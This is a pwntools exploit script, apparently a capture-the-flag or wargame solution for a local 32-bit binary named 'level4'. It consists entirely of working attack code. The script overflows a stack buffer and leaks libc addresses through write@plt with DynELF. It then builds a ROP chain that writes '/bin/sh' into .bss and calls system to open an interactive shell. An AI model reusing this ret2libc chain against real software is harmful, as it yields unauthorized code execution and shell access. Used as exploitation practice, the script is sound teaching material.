from pwn import *
p = process('./level4')
# p = remote('127.0.0.1',10004)
# socat TCP4-LISTEN:10004,fork EXEC:./level4
# gdb.attach(pidof(p)[0])
# context.log_level = 'debug'

    
write_plt = 0x8048320
read_plt = 0x8048300
main = 0x8048460

def leak(address):
    payload = 'B'*140 + p32(write_plt) + p32(main) + p32(1)  + p32(address) + p32(4) # 1<= size is ok 
    p.sendline(payload)
    data = p.recv(4)
    log.info("%#x => %s" % (address, (data or '').encode('hex')))
    return data


d = DynELF(leak, elf=ELF('level4'))
system_addr = d.lookup('system', 'libc')
log.info("system_addr=" + hex(system_addr))

# write /bin/sh
bss_addr = 0x0804a020
ret_addr = 0x080484f9 #  pop esi ; pop edi ; pop ebp ; ret
payload = 'B'*140 + p32(read_plt) +  p32(ret_addr) +  p32(0) + p32(bss_addr) + p32(8)
payload += p32(system_addr) + p32(0xdeafbeaf) + p32(bss_addr)

p.sendline(payload)
p.sendline("/bin/sh\x00")

p.interactive()

